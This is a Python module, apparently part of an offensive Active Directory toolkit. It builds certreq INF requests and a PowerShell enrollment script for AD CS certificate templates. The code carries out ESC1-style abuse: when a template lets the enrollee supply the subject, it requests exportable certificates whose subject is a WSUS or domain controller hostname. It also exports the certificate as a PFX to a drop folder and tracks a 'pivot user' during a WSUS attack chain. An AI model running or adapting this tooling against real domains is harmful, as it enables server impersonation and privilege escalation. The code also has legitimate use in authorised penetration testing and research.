from __future__ import annotations

import json
import re
from dataclasses import dataclass
from typing import TYPE_CHECKING, Any

from admapper.adcs.constants import CT_FLAG_MACHINE_TYPE
from admapper.adcs.eku import template_profile_from_inventory

if TYPE_CHECKING:
    from admapper.support.session import Session

_ENROLL_FAILURE_RE = re.compile(
    r"(?i)(user context template conflicts|denied by|access is denied|"
    r"template.*conflict|certificate request failed|the request failed|"
    r"0x[0-9a-f]{8}|error)"
)


@dataclass
class EnrollProfile:
    template: str
    dns_name: str
    ca_host: str
    ca_name: str
    machine_context: bool
    enrollee_supplies_subject: bool
    wsus_esc1_subject: bool = False
    enroll_user_cn: str | None = None

    @classmethod
    def from_template(
        cls,
        *,
        template: str,
        dns_name: str,
        ca_host: str,
        ca_name: str,
        enrollment_flags: int = 0,
        enrollee_supplies_subject: bool = False,
        enroll_user_cn: str | None = None,
    ) -> EnrollProfile:
        machine = bool(enrollment_flags & CT_FLAG_MACHINE_TYPE)
        return cls(
            template=template,
            dns_name=dns_name,
            ca_host=ca_host,
            ca_name=ca_name,
            machine_context=machine,
            enrollee_supplies_subject=enrollee_supplies_subject,
            enroll_user_cn=enroll_user_cn,
        )


@dataclass
class EnrollLogStatus:
    present: bool
    text: str
    success: bool
    errors: list[str]


def load_enroll_profile(
    session: Session | None,
    *,
    template: str,
    dns_name: str,
    ca_host: str,
    ca_name: str,
    run_as_user: str | None = None,
) -> EnrollProfile:
    """Build enrollment profile from workspace AD CS inventory when available."""
    flags = 0
    enrollee_supplies_subject = False
    profile: dict[str, Any] = {}
    if session and session.workspace:
        inv_path = session.workspaces.path_for(session.workspace.name) / "adcs_inventory.json"
        if inv_path.is_file():
            inventory = json.loads(inv_path.read_text(encoding="utf-8"))
            profile = template_profile_from_inventory(inventory, template)
            for item in inventory.get("templates") or []:
                if str(item.get("name") or "") == template:
                    flags = int(item.get("enrollment_flags") or 0)
                    enrollee_supplies_subject = bool(item.get("enrollee_supplies_subject"))
                    break
            if not enrollee_supplies_subject:
                enrollee_supplies_subject = bool(profile.get("enrollee_supplies_subject"))
    return EnrollProfile(
        template=template,
        dns_name=dns_name,
        ca_host=ca_host,
        ca_name=ca_name,
        machine_context=bool(flags & CT_FLAG_MACHINE_TYPE),
        enrollee_supplies_subject=enrollee_supplies_subject,
        wsus_esc1_subject=_wsus_esc1_subject(template, profile, enrollee_supplies_subject),
        enroll_user_cn=run_as_user.split("@")[0] if run_as_user else None,
    )


def _wsus_esc1_subject(
    template: str,
    profile: dict,
    enrollee_supplies_subject: bool,
) -> bool:
    """ESC1-style WSUS cert: subject = WSUS/DC FQDN (EnrolleeSuppliesSubject + Server Auth)."""
    if enrollee_supplies_subject and profile.get("wsus_chain_step"):
        return True
    if profile.get("wsus_chain_step") and template in ("User", "WebServer"):
        return True
    return False


def validate_enroll_principal(username: str, *, machine_template: bool) -> list[str]:
    """Return warnings when the enrolling principal cannot match the template context."""
    name = (username or "").strip().lower()
    warnings: list[str] = []
    if name.endswith("$") and not machine_template:
        warnings.append(
            f"{username} is a machine account — user templates (e.g. User) must enroll "
            f"as the scheduled-task user, not via WinRM as a machine/gMSA account"
        )
    return warnings


def build_cert_request_inf(profile: EnrollProfile) -> str:
    """
    Build certreq INF aligned with template context.

    WSUS / ESC1 (EnrolleeSuppliesSubject + Server Auth): Subject CN = WSUS FQDN.
    Plain user v2 templates: empty Subject, DNS in SAN only.
    Never use machine CN as Subject under a user-context enroll (causes certreq conflict).
    """
    if profile.machine_context:
        subject = f"CN={profile.dns_name}"
        machine_key = "TRUE"
    elif profile.wsus_esc1_subject or profile.enrollee_supplies_subject:
        subject = f"CN={profile.dns_name}"
        machine_key = "FALSE"
    else:
        subject = ""
        machine_key = "FALSE"

    subject_line = f'Subject = "{subject}"' if subject else "Subject = "

    return f"""[NewRequest]
{subject_line}
KeyLength = 2048
KeySpec = 1
Exportable = TRUE
MachineKeySet = {machine_key}
Silent = TRUE
RequestType = PKCS10
[Extensions]
2.5.29.17 = "{{text}}dns={profile.dns_name}&"
[RequestAttributes]
CertificateTemplate = {profile.template}
"""


def parse_enroll_log(
    text: str,
    *,
    since_marker: str | None = None,
    expect_user: str | None = None,
) -> EnrollLogStatus:
    body = (text or "").strip()
    if not body:
        return EnrollLogStatus(
            present=False, text="", success=False, errors=["enroll.log empty or missing"]
        )
    if since_marker and since_marker in body:
        body = body.split(since_marker, 1)[-1]
    lowered = body.lower()
    success = (
        "pfx:" in lowered
        or "issued" in lowered
        or "request complete" in lowered
        or "certificate retrieved" in lowered
    )
    errors = [line.strip() for line in body.splitlines() if _ENROLL_FAILURE_RE.search(line)]
    for line in body.splitlines():
        if "=== enroll" in line.lower() and " as " in line.lower():
            who = line.lower().split(" as ", 1)[-1].split(" template=", 1)[0].strip()
            if who.endswith("$"):
                errors.append(
                    f"enroll ran as machine principal {who.strip()} — wait for task as {expect_user or 'pivot user'}"
                )
            elif expect_user and expect_user.lower() not in who:
                errors.append(f"enroll ran as {who.strip()} but task user is {expect_user}")
    if not success and not errors and "conflict" in lowered:
        errors.append(
            "template context conflict — enroll must run as the task user, not gMSA over WinRM"
        )
    return EnrollLogStatus(present=True, text=body, success=success, errors=errors)


def build_local_enroll_powershell(
    *,
    template: str,
    dns_name: str,
    ca_host: str,
    ca_name: str,
    profile: EnrollProfile | None = None,
    run_as_user: str | None = None,
    drop_path: str = r"C:\ProgramData",
) -> str:
    """PowerShell to request a template cert as the current interactive user."""
    prof = profile or EnrollProfile.from_template(
        template=template,
        dns_name=dns_name,
        ca_host=ca_host,
        ca_name=ca_name,
        enroll_user_cn=run_as_user.split("@")[0] if run_as_user else None,
    )
    inf = build_cert_request_inf(prof)
    pfx_name = dns_name
    log_path = f"{drop_path.rstrip('\\')}\\enroll.log"
    out_dir = drop_path.rstrip("\\")
    return f"""
$log = '{log_path}'
Start-Transcript -LiteralPath $log -Append -Force
Write-Output "=== enroll $(Get-Date -Format o) as $(whoami) template={prof.template} ==="
$inf = @'
{inf.strip()}
'@
$dir = $env:TEMP
Set-Content -Path "$dir\\request.inf" -Value $inf -Encoding ASCII
Get-Content "$dir\\request.inf" -Raw
$new = & certreq -new "$dir\\request.inf" "$dir\\request.req" 2>&1 | Out-String
Write-Output "certreq -new: $new"
if ($LASTEXITCODE -ne 0) {{ Stop-Transcript; exit $LASTEXITCODE }}
$sub = & certreq -submit -config "{prof.ca_host}\\{prof.ca_name}" "$dir\\request.req" "$dir\\cert.cer" 2>&1 | Out-String
Write-Output "certreq -submit: $sub"
if ($LASTEXITCODE -ne 0) {{ Stop-Transcript; exit $LASTEXITCODE }}
$merge = & certutil -mergepfx "$dir\\cert.cer" "$dir\\{pfx_name}.pfx" NoChain 2>&1 | Out-String
Write-Output "certutil -mergepfx: $merge"
Copy-Item "$dir\\{pfx_name}.pfx" "{out_dir}\\{pfx_name}.pfx" -Force
Get-ChildItem "{out_dir}\\*.pfx" | ForEach-Object {{ Write-Output "PFX: $($_.FullName) $($_.Length)" }}
Stop-Transcript
""".strip()
